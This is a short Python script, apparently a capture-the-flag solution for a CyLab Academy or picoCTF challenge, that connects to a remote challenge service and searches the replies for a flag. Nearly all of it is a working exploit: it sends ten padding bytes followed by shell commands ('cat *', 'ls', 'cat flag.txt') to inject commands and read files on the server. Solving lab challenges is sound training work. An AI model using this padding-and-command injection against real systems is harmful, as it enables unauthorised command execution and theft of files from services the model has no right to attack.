import sys, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "xebec.cylabacademy.net", 27858


def run(cmd):
    s = socket.create_connection((HOST, PORT), timeout=20)
    s.settimeout(6)
    time.sleep(0.5)
    try:
        s.recv(8192)
    except Exception:
        pass
    payload = "A" * 10 + cmd
    s.sendall((payload + "\n").encode())
    out = b""
    t0 = time.time()
    while time.time() - t0 < 6:
        try:
            c = s.recv(16384)
            if not c:
                break
            out += c
        except socket.timeout:
            break
    s.close()
    return out.decode("utf-8", "replace")


for cmd in ("cat *", "ls", "cat flag.txt"):
    print("=== commande: %r ===" % cmd)
    o = run(cmd)
    print(o[:600])
    f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", o)
    if f:
        print("FLAG:", f.group(0))
        break
    print()
